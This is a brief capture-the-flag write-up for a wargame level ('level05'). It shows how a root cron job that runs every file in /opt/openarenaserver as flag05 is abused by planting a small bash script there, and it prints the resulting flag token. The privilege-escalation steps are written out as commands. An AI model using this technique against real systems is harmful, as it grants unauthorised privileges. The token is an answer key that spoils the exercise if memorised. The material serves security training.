# level05 solution
On ogin to the level via ssh new mail message notification appears. This message contains:

	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

It is a crontab entry for flag05 user to lauch script every 2nd minute. Next step we can check contence of this script:

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done

This script runs through /opt/openarenaserver and executes every file which this directory contains. We can create our own script and copy it in /opt/openarenaserver to be executed under flag05 user:

	#!/bin/bash
	/bin/getflag > /tmp/level05_token

After a minute we check if our token file was created:
	
	cat /tmp/level05_token
	Check flag.Here is your token : viuaaale9huek52boumoomioc

